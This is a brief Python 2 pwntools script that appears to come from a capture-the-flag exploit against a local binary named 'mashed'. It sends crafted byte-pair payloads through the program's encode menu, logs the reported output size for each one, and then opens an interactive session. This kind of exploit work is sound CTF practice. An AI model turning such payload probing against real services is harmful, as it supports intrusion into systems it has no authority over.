from pwn import *
p = process('./mashed')

def en(len, text):
	r = p.recvuntil('Select :')
	p.sendline('2')
	r = p.recvuntil('length:')
	p.sendline(str(len))
	r = p.recvuntil(':')
	p.sendline(text)
	rdata = p.recvuntil('byte')
	rdata = rdata.split(' ')
	return int(rdata[1])

l = []
for i in range(256):
	if i == 0x9c or i == 0 or chr(i) == '\n' or chr(i) == 'x':
		continue
	l.append(i)
choice = 'ee'
ll = []
res = 0
for magic in l:
	payload  = ''
	i = 0
	c = 0
	while True:
		if l[i] == magic:
			i += 1
			continue
		payload += chr(magic) + chr(l[i])
		i += 1
		c += 1
		if c == 251:
			break
	payload += chr( l[251] )
	nres = en(506, payload)

	payload += '\n' + '\x00'
	ans = ''
	for ch in payload:
		ans += '\\x' + ch.encode('hex')
	print ans
	print 'res: ', nres
	if choice != 'go':
		choice = raw_input()
	
		
	ll.append( nres )
print ll
print min(ll)
p.interactive()
